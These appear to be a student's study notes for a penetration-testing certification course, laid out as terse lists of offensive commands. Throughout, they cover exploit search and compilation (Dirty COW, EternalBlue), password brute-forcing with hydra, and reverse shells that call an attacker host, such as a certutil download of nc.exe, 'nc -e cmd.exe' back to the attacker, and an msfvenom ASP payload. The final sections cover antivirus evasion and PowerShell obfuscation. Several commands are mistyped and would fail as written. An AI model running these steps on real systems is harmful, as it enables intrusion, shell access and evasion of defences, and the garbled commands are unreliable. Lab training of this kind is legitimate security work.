# 08hakr's Short notes of e	JPT
# 009 INE-Host-and-Network-Penetration-Testing-Exploitation

## Vulnerability Scanning Overview
### Banner Grabbing
- nmap -sV -O <target-ip>
- ls -al /usr/share/nmap/scripts/ | grep banner
- nc <target-ip>
- searchsploit openssh 7.2
- ssh root@<target-ip>

### Vulnerability Scanning With Nmap
- ls -al /usr/share/nmap/scripts/ | grep http
- ls -al /usr/share/nmap/scripts/ | grep vuln
- nmap -sV -p80 --script=http-shellshock --scriot-args "http-shellshock.uri=/gettime.cgi" <target-ip>

### Vulnerability Scanning with Metasploit
- nmap -sS -sV <target-ip>
- searchsploit ms17-010
- etrnalblue ms17-010

## Searching and Fixing Exploits
### Searching
- searching for Publicly available Exploits
- exploit-db.com
- rapid7.com
- google dorks
- packet storm for latest vulnerabilities and latest news
- Searching exploits locally 
- searchsploit
- ls -al /usr/share/exploitdb
- searchsploit vsftpd 2.3.4
- searchsploit -m <id>
- searchsplout -t vsftpd Only search in title text
- searchsploit remote windows smb
- searchsploit remote linux ssh
- searchsploit remote linux -w | grep -e "eternalblue"

### Fixing and how to do Modification
- nmap -sS -sV <target-ip>
- searchsploit http file server 2.3
- cd Desktop/
- searchsploit -m <id-39161>
- cp /usr/share/windows-resources/binaries/nc.exe .
- Cross Compiling Exploits compiling windows exploits
- needed mingw-w64,gcc
- Exploits used: videoLAN VLC media Player explit/9303
- searchsplot -m 9303
- in terminal
- i686-w64-mingw32-gcc 9303.c -o exploit
- i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32
- Exploit Used: Dirty Cow compiling linux exploits
- searchsploit dirty cow
- searchsploit -m 40839
- gcc -pthread 40839.c -o exploit -lcrypt
- precompile binaries of Exploits 
- github.com/offensive-security/exploit-bin-sploits

## Bind and Reverse Shells
### netcat
- nc -nv <target-ip> <port>
- nc -nvu <target-ip> <port> for udp port connect
- ls -al /usr/share/windows-binaries/ where the nc.exe is stored
- python -m SimpleHTTPServer 80
- certutil -urlcache -f http://<attacker-ip>/nc.exe
- setting listener
- nc -lvnp <port>
- conneting
- nc -nv <target-ip> <port>
- to send file on target system
- setup listener on target system
- nc -lvnp 80 > test.txt
- now start the connection and send
- nc -nv <target-ip> < test.txt
- 
### Bind Shell
- /bin/bash, cmd.exe OR powershell.exe
- listing on Windows: nc -lvnp <port> -e(windows)/-c(linux) cmd.exe
- connecting via linuc: nc -nv <target-ip> <port>
- 

### Reverse Shell
- listing on linux system: nc -lvnp <port> 
- connecting via windows system: nc -nv <attacker-ip> <port> -e cmd.exe
### linux Cheat Sheet
- seisskyrepo/PayloadsAllTheThings/Methodology and Resources/Reverse Shell CheatSheet
- Revshell.com revershell generator

## Exploitation Metasploit Frameworks
- nmap use default credential of process maker
- searchsploit processmaker
- searchsploit -m 29325
- msfconsole and exploit
### Poweshell Empire
- starkiller is a frontend GUI for Powershell
- sudo powershell-empire server
- sudo powershell-empire client
- listeners, agents
- starkiller
- http://localhost:1337
- empireadmin
- password123
- create Listener
- create a stager
- agents
- interact Windows7
- 

## Windows Exploitation Black Box Penetration Test
### Port Scanning and Enumeration
- cat /etc/host
- nmap -sV <target-ip>
- nmap -T4 -PA -sC -sV -p 1-10000 <target-ip> -oX nmap10k
- import result to the metasploit
- find version with smb_version module
### Windows IIS 
- nmap -sV -p21,80 <target-ip>
- ls -al /usr/share/nmap/scripts | grep ftp-
- hydra -L /usr/share/wordlists/metasploit/unix_users/txt -P /unix_password <target-ip> ftp
- generate a asp reverseshell and upload and run it
- msfvenom -p windows/shell/reverse_tcp Lhost=<attacker-ip> Lport=1234 -f asp > shell.aspx
- set multi-handler and run

### Targeting OpenSSH
- nmap -sC -sC -p 22 <target-ip>
- searchsploit
- hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt <target-ip> ssh
- net localgroup administrators
- whoami /priv
### Targeting SMB 445
- nmap -sV -sC -p 445 <target-ip>
- smbclient -L <target-ip> -U vagrant
- enum4linux -u -p <taerget-ip>
- search smb_enumusers
- locate psexec.py
- python3 psexec.py Administrator@<target-ip>

### Targeting MySQL Database Server 3306
- search mysql_login
- use set run
- mysql -u root -p -h <target-ip>
- msfconsole
- eternalblue
- phpmyadmin.conf search and modify the rule to allow all
- now shell
- net stop wampapache 
- net start wampapache

## Linux Exploitation
### Port Scanning And Enumeration
- nmap -sV -sS -p- <target-ip>
### Exploiting vsFTPd
- nmap -p21
- nmap -sV -p25 
- search smtp_enum
- hydra -l service -P /usr/share/.../unix_passwords.txt <target-ip> ftp
### Targeting PHP
- nmap -p80
- /phpinfo.php
- searchsploit php cgi
- searchsploit -m  18836
### Targeting SAMBA
- nmap -p445
- nc -nv banner grabbing
- search smb_version
- use set run
- 
## Obfuscation AV Evasion & Obfuscation
- shellterproject
- apt-get install shellter
- dpkg --add-architecture i3-x86
- apt-get install wine32
- cd /usr/share/windows-resources/shellter
- sudo wine shellter.exe
- cd /usr/share/windows-binaries
- Copy one of the binari
- enter the path and name of binari that been copyed to new path
- now set up multi/handler and run the .exe file
### Obfuscating PowerShell Code
- download repo Invoke-Obfuscation
- sudo apt-get install powershell 
- pwsh
- import-module ./Invoke-Obfuscation.psd1
- Invoke-Obfuscation
- copy the Power shell reverse shell code from reverseshellcheatsheet payloads AllThe Things.
- crop it use text in Double Quot
- change IP and Port
- save it in file
- SET SCRIPTPATH PATH/shell.ps1
- ENCODING
- ASCII
- RESET
- BACK
- AST
- ALL
